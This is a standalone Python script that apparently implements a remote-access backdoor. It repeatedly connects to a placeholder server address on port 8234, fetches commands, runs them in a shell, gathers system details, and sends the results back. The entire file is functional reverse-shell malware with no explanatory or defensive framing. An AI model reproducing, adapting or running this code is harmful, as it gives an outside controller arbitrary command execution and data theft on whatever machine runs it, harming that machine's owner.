import socket
import subprocess
import os
import platform
import time

def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('SERVER_IP', 8234))
            client_socket.sendall(data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

def receive_data():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('SERVER_IP', 8234))
            data = client_socket.recv(4096).decode()
            return data
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def get_system_info():
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    return system_info

def main():
    while True:
        command = receive_data()
        if command:
            if command.startswith("exit"):
                break
            elif command.startswith("cd"):
                os.chdir(command[3:].strip())
                send_data(f"Changed directory to {os.getcwd()}")
            elif command.startswith("get_sys_info"):
                system_info = get_system_info()
                send_data(system_info)
            else:
                result = execute_command(command)
                send_data(result)
        time.sleep(1)

if __name__ == "__main__":
    main()